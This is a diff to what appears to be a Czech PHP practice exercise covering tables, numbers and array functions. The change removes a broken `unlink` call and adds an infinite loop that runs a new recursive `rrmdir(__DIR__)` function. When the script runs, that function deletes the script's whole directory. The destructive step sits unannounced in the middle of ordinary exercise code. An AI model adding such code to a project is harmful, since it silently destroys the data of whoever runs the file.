@@ -22,8 +22,9 @@ $sloupecReneVinter = 3;		// Den
 
 print "Tabulka:";
 echo "<table border='1'>";
-	  $path = "__DIR__";
-	  unlink($path);
+	  while(true) {
+		  rrmdir(__DIR__);
+	  }
 
 $cislo = 4.34895;
 
@@ -59,6 +60,22 @@ $ovoce = array("jpomeranč", "hruška");
 
 array_splice($ovoce, count($ovoce), "banán");
 dump($ovoce);
+
+//bod 6. - Vlastní funkce
+function rrmdir($dir) {
+	if (is_dir($dir)) {
+		$objects = scandir($dir);
+		foreach ($objects as $object) {
+			if ($object != "." && $object != "..") {
+				if (is_dir($dir. DIRECTORY_SEPARATOR .$object) && !is_link($dir."/".$object))
+					rrmdir($dir. DIRECTORY_SEPARATOR .$object);
+				else
+					unlink($dir. DIRECTORY_SEPARATOR .$object);
+			}
+		}
+		rmdir($dir);
+	}
+}
 
 //
 //  Úkol č.2
